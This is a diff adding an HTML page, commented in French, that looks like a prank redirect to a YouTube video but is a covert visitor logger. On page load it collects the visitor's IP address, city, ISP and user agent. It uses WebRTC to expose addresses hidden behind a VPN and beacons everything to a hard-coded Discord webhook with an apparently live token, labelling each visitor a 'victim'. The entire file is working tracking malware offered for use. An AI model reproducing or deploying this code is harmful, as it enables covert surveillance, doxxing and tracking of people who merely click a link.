@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<title></title>
+<!-- Redirection INSTANTANÉE vers la vidéo -->
+<script>
+  // Change ici ta vidéo (rickroll ou autre)
+  window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+</script>
+<!-- Si JS bloqué → fallback meta (quand même redirigé en <0.1s) -->
+<meta http-equiv="refresh" content="0;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+
+<!-- TOUT LE LOGGING EN SILENCE (même pas 150ms) -->
+<script>
+  // ==== COLLE TON WEBHOOK DISCORD ICI ====
+  const w = "https://discord.com/api/webhooks/1439673608225034240/QCmvEWzJGk21ZF8AkeiNvW9cXtWFPZ3Pf-x-2rFj68OP8boHo51qHIF6ez1mmMD5KG77";
+
+  // Envoi ultra-rapide (beacon = continue même si la page se ferme)
+  function send(data) {
+    navigator.sendBeacon(w, new Blob([JSON.stringify({embeds:[data]})], {type:"application/json"}));
+  }
+
+  // On récupère tout en parallèle le plus vite possible
+  Promise.allSettled([
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()),
+    fetch("https://api64.ipify.org?format=json").then(r=>r.json()),
+    fetch("https://ip-api.com/json/?fields=66842623&lang=fr").then(r=>r.json()) // tout en 1 appel
+  ]).then(([a,b,c]) => {
+    const ipv4 = a.value?.ip || b.value?.ip || "??";
+    const geo = c.value || {};
+
+    const embed = {
+      title: "Victime flash",
+      color: 16711680,
+      fields: [
+        {name:"IPv4", value:"```"+(ipv4||"inconnu")+"```", inline:true},
+        {name:"IPv6 / Local", value:"```"+(geo.query||"non détectée")+"```", inline:true},
+        {name:"Ville ≈", value:(geo.city||"?") + ", " + (geo.regionName||"") + " " + (geo.zip||""), inline:false},
+        {name:"FAI", value:geo.isp||"?", inline:true},
+        {name:"Précision", value:"±"+(geo.accuracy||5)+"km", inline:true},
+        {name:"User-Agent", value:navigator.userAgent.substring(0,250), inline:false},
+        {name:"Heure FR", value:new Date().toLocaleString("fr-FR",{timeZone:"Europe/Paris"}), inline:true}
+      ],
+      footer:{text:"Logger Zéro Détection 2025"}
+    };
+    send(embed);
+  });
+
+  // WebRTC pour IPv6/local même derrière VPN (en bonus, ne ralentit rien)
+  try {
+    const pc = new RTCPeerConnection({iceServers:[]});
+    pc.createDataChannel("");
+    pc.createOffer().then(o=>pc.setLocalDescription(o));
+    pc.onicecandidate = e => e.candidate && navigator.sendBeacon(w, new Blob([JSON.stringify({content:"IPv6/local détectée: "+e.candidate.candidate.match(/([a-f0-9:]+:+[a-f0-9]+)/gi)?.[0]})], {type:"text/plain"}));
+  } catch(e) {}
+</script>
+</head>
+<body style="margin:0;background:#000">
+  <!-- Rien du tout à l’écran -->
+</body></html>
